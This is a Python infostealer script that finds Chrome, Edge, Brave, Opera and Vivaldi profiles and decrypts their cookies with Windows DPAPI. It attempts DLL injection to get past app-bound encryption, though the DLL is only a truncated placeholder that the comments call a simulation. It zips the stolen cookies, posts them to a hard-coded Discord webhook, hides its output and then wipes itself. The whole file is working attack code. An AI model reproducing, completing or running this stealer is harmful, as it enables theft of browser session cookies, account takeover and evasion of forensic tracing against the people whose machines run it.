# COOKIE EXTRACTOR - FULL INTEGRATED VERSION
# Includes: multi-drive path discovery, app-bound bypass, webhook exfiltration, self-delete

import os
import sys
import json
import time
import base64
import sqlite3
import shutil
import zipfile
import tempfile
import subprocess
import winreg
import ctypes
import ctypes.wintypes
from pathlib import Path

# ========== CONFIGURATION ==========
# Webhook URL (will be wiped from memory after use)
WEBHOOK_URL = "https://discord.com/api/webhooks/1502736873209200710/draZs4ckaCrX_SYkS-_5HqSPCfqZYqVzDwkZHSWmvS5xhoEFdwErTPQulSct9oRzgWLC"

# DLL placeholder - actual DLL would be embedded or fetched
# This is a SIMULATION placeholder - real attack would use compiled DLL
DLL_BASE64_PLACEHOLDER = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA"  # TRUNCATED - REPLACE WITH REAL DLL

# ========== UTILITY FUNCTIONS ==========

def silent_install_requirements():
    """Install required packages silently if missing"""
    required = ['requests', 'pywin32']
    missing = []
    for pkg in required:
        try:
            __import__(pkg.replace('pywin32', 'win32crypt'))
        except ImportError:
            missing.append(pkg)
    
    if missing:
        with open(os.devnull, 'w') as devnull:
            for pkg in missing:
                subprocess.run([sys.executable, '-m', 'pip', 'install', '--quiet', pkg],
                               stdout=devnull, stderr=devnull, creationflags=0x08000000)

def decrypt_dpapi(encrypted_value):
    """Decrypt using Windows DPAPI"""
    try:
        import win32crypt
        return win32crypt.CryptUnprotectData(encrypted_value)[1].decode('utf-8', errors='ignore')
    except:
        return ""

def inject_dll_extract_cookies(browser_path, dll_data_b64):
    """
    Launch browser in suspended mode, inject DLL to extract app-bound cookies
    NOTE: Requires actual DLL - this is a stub for simulation
    """
    cookies = []
    if not dll_data_b64 or len(dll_data_b64) < 100:
        return cookies  # Skip if no valid DLL
    
    try:
        dll_bytes = base64.b64decode(dll_data_b64)
        dll_path = os.path.join(tempfile.gettempdir(), f"~tmp_{os.getpid()}.dll")
        with open(dll_path, "wb") as f:
            f.write(dll_bytes)
        
        # Create suspended process
        startup_info = ctypes.wintypes.STARTUPINFOW()
        process_info = ctypes.wintypes.PROCESS_INFORMATION()
        creation_flags = 0x00000004  # CREATE_SUSPENDED
        
        ctypes.windll.kernel32.CreateProcessW(
            browser_path, None, None, None, False,
            creation_flags, None, None,
            ctypes.byref(startup_info), ctypes.byref(process_info)
        )
        
        # Allocate memory and inject DLL
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        kernel32.VirtualAllocEx.restype = ctypes.c_void_p
        
        dll_path_bytes = dll_path.encode('utf-16le')
        remote_mem = kernel32.VirtualAllocEx(process_info.hProcess, None, len(dll_path_bytes), 0x1000, 0x40)
        kernel32.WriteProcessMemory(process_info.hProcess, remote_mem, dll_path_bytes, len(dll_path_bytes), None)
        kernel32.CreateRemoteThread(process_info.hProcess, None, 0, remote_mem, None, 0, None)
        
        kernel32.ResumeThread(process_info.hThread)
        kernel32.WaitForSingleObject(process_info.hProcess, 8000)
        
        # Read extracted cookies
        output_path = os.path.join(tempfile.gettempdir(), "cookies_output.json")
        if os.path.exists(output_path):
            with open(output_path, "r", encoding="utf-8") as f:
                cookies = json.load(f)
            os.remove(output_path)
        
        kernel32.CloseHandle(process_info.hProcess)
        kernel32.CloseHandle(process_info.hThread)
        os.remove(dll_path)
    except Exception as e:
        pass
    
    return cookies

# ========== OPTIMIZED BROWSER PATH DISCOVERY ==========

def get_browser_paths_optimized():
    """Find browser installations using registry + common paths (fast)"""
    drives = ['C:\\']
    for letter in 'DEFGH':
        potential = f"{letter}:\\"
        if os.path.exists(potential):
            drives.append(potential)
    
    browsers = {
        'chrome': 'chrome.exe',
        'edge': 'msedge.exe', 
        'brave': 'brave.exe',
        'opera': 'opera.exe',
        'vivaldi': 'vivaldi.exe'
    }
    
    registry_paths = {
        'chrome': [r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe",
                   r"SOFTWARE\WOW6432Node\Google\Update\Clients\{8A69D345-D564-463C-AFF1-A69D9E530F96}",
                   r"SOFTWARE\Google\Chrome"],
        'edge': [r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe",
                 r"SOFTWARE\WOW6432Node\Microsoft\Edge"],
        'brave': [r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\brave.exe",
                  r"SOFTWARE\BraveSoftware\Brave-Browser"],
        'opera': [r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\opera.exe",
                  r"SOFTWARE\WOW6432Node\Opera Software"],
        'vivaldi': [r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\vivaldi.exe",
                    r"SOFTWARE\Vivaldi"]
    }
    
    user_level = [
        os.path.expandvars(r"%LOCALAPPDATA%\{browser}\Application"),
        os.path.expandvars(r"%APPDATA%\{browser}"),
        os.path.expandvars(r"%USERPROFILE%\AppData\Local\{browser}\Application"),
    ]
    
    found_paths = {browser: [] for browser in browsers}
    
    # Registry check
    for browser, reg_keys in registry_paths.items():
        for reg_key in reg_keys:
            for hive in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
                try:
                    key = winreg.OpenKey(hive, reg_key, 0, winreg.KEY_READ)
                    for value_name in ['', 'InstallPath', 'Program', 'Path']:
                        try:
                            path, _ = winreg.QueryValueEx(key, value_name)
                            if path and os.path.exists(path):
                                exe_path = os.path.join(path, browsers[browser])
                                if os.path.exists(exe_path):
                                    found_paths[browser].append(exe_path)
                            break
                        except:
                            continue
                    winreg.CloseKey(key)
                except:
                    continue
    
    # User-level installs
    for browser, exe_name in browsers.items():
        for user_path in user_level:
            path = user_path.format(browser=browser.capitalize())
            exe_path = os.path.join(path, exe_name)
            if os.path.exists(exe_path):
                found_paths[browser].append(exe_path)
            alt_path = user_path.replace(r"\Application", "")
            alt_exe = os.path.join(alt_path, exe_name)
            if os.path.exists(alt_exe):
                found_paths[browser].append(alt_exe)
    
    # System-wide (if not found)
    for browser, exe_name in browsers.items():
        if not found_paths[browser]:
            default_paths = [
                rf"C:\Program Files\{browser.capitalize()}\Application\{exe_name}",
                rf"C:\Program Files (x86)\{browser.capitalize()}\Application\{exe_name}",
            ]
            if browser == 'chrome':
                default_paths.extend([r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                                       r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"])
            elif browser == 'edge':
                default_paths.append(r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
            
            for path in default_paths:
                if os.path.exists(path):
                    found_paths[browser].append(path)
                    break
            
            if not found_paths[browser]:
                for drive in drives:
                    patterns = [rf"{drive}Program Files\{browser.capitalize()}\Application\{exe_name}",
                                rf"{drive}Program Files (x86)\{browser.capitalize()}\Application\{exe_name}",
                                rf"{drive}{browser.capitalize()}\{exe_name}"]
                    for pattern in patterns:
                        if os.path.exists(pattern):
                            found_paths[browser].append(pattern)
                            break
                    if found_paths[browser]:
                        break
    
    for browser in found_paths:
        found_paths[browser] = list(dict.fromkeys(found_paths[browser]))
    
    return found_paths

def find_browser_profiles_fast():
    """Find browser profile folders containing cookie databases"""
    profile_paths = {'chrome': [], 'edge': [], 'brave': [], 'opera': [], 'vivaldi': []}
    
    profile_bases = [os.path.expandvars(r"%LOCALAPPDATA%"), os.path.expandvars(r"%APPDATA%"),
                     os.path.expandvars(r"%USERPROFILE%\AppData\Local")]
    
    browser_folders = {
        'chrome': ['Google\\Chrome\\User Data', 'Chrome\\User Data'],
        'edge': ['Microsoft\\Edge\\User Data', 'Edge\\User Data'],
        'brave': ['BraveSoftware\\Brave-Browser\\User Data'],
        'opera': ['Opera Software\\Opera Stable'],
        'vivaldi': ['Vivaldi\\User Data']
    }
    
    for base in profile_bases:
        if not os.path.exists(base):
            continue
        for browser, folders in browser_folders.items():
            for folder in folders:
                profile_dir = os.path.join(base, folder)
                if os.path.exists(profile_dir):
                    cookie_db = os.path.join(profile_dir, 'Default', 'Network', 'Cookies')
                    if browser == 'opera':
                        cookie_db = os.path.join(profile_dir, 'Network', 'Cookies')
                    if os.path.exists(cookie_db):
                        profile_paths[browser].append(profile_dir)
                    else:
                        cookie_db_alt = os.path.join(profile_dir, 'Default', 'Cookies')
                        if os.path.exists(cookie_db_alt):
                            profile_paths[browser].append(profile_dir)
    
    return profile_paths

def extract_native_cookies_from_profile(browser_name, profile_path):
    """Extract cookies from profile without app-bound encryption"""
    cookies = []
    
    if browser_name == 'opera':
        cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
        if not os.path.exists(cookie_db):
            cookie_db = os.path.join(profile_path, 'Cookies')
    else:
        cookie_db = os.path.join(profile_path, 'Default', 'Network', 'Cookies')
        if not os.path.exists(cookie_db):
            cookie_db = os.path.join(profile_path, 'Default', 'Cookies')
    
    if not os.path.exists(cookie_db):
        return cookies
    
    temp_db = os.path.join(tempfile.gettempdir(), f"~{browser_name}_{os.getpid()}.db")
    try:
        shutil.copy2(cookie_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
        
        for row in cursor.fetchall():
            decrypted = decrypt_dpapi(row[3])
            if decrypted and len(decrypted) > 0:
                cookies.append({
                    "host": row[0],
                    "name": row[1],
                    "path": row[2],
                    "value": decrypted,
                    "expires": row[4],
                    "browser": browser_name
                })
        conn.close()
    except:
        pass
    finally:
        if os.path.exists(temp_db):
            os.remove(temp_db)
    
    return cookies

# ========== EXFILTRATION ==========

def zip_and_send(cookies_dir, webhook_url):
    """Zip all cookies and send to Discord webhook"""
    zip_path = os.path.join(tempfile.gettempdir(), f"~cookies_{os.getpid()}.zip")
    
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(cookies_dir):
                for file in files:
                    if file.endswith('.json'):
                        zf.write(os.path.join(root, file), file)
        
        import requests
        with open(zip_path, 'rb') as f:
            files = {'file': (f"cookies_{int(time.time())}.zip", f, 'application/zip')}
            requests.post(webhook_url, files=files, timeout=15)
    except:
        pass
    finally:
        if os.path.exists(zip_path):
            os.remove(zip_path)

# ========== SELF-DESTRUCT ==========

def self_destruct():
    """Delete the script file and wipe traces"""
    script_path = sys.argv[0]
    try:
        # Overwrite with zeros
        with open(script_path, 'wb') as f:
            f.write(b'\x00' * min(1024 * 1024, os.path.getsize(script_path)))
        os.remove(script_path)
    except:
        try:
            os.remove(script_path)
        except:
            pass
    
    # Clean temp files
    temp_dir = tempfile.gettempdir()
    for f in os.listdir(temp_dir):
        if f.startswith('~cookies_') or f.startswith('~tmp_') or f.startswith('~req_'):
            try:
                os.remove(os.path.join(temp_dir, f))
            except:
                pass

# ========== MAIN ==========

def main():
    """Main execution - all cookies → zip → webhook → self-delete"""
    # Suppress all output
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    
    # Install requirements silently
    silent_install_requirements()
    
    # Create output directory
    output_dir = os.path.join(tempfile.gettempdir(), f"~cookies_{os.getpid()}")
    os.makedirs(output_dir, exist_ok=True)
    
    # Find browsers and profiles
    browser_exes = get_browser_paths_optimized()
    profiles = find_browser_profiles_fast()
    
    # Extract Chrome (app-bound - requires DLL injection)
    for chrome_path in browser_exes.get('chrome', []):
        if os.path.exists(chrome_path):
            chrome_cookies = inject_dll_extract_cookies(chrome_path, DLL_BASE64_PLACEHOLDER)
            if chrome_cookies:
                with open(os.path.join(output_dir, "chrome.json"), "w") as f:
                    json.dump(chrome_cookies, f)
    
    # Extract Edge (app-bound)
    for edge_path in browser_exes.get('edge', []):
        if os.path.exists(edge_path):
            edge_cookies = inject_dll_extract_cookies(edge_path, DLL_BASE64_PLACEHOLDER)
            if edge_cookies:
                with open(os.path.join(output_dir, "edge.json"), "w") as f:
                    json.dump(edge_cookies, f)
    
    # Extract other browsers (native)
    for browser in ['brave', 'opera', 'vivaldi']:
        for profile in profiles.get(browser, []):
            cookies = extract_native_cookies_from_profile(browser, profile)
            if cookies:
                with open(os.path.join(output_dir, f"{browser}.json"), "w") as f:
                    json.dump(cookies, f)
    
    # Send to Discord
    zip_and_send(output_dir, WEBHOOK_URL)
    
    # Cleanup
    shutil.rmtree(output_dir, ignore_errors=True)
    
    # Wipe webhook URL from memory (overwrite variable)
    global WEBHOOK_URL
    WEBHOOK_URL = ""

if __name__ == "__main__":
    try:
        main()
    finally:
        self_destruct()
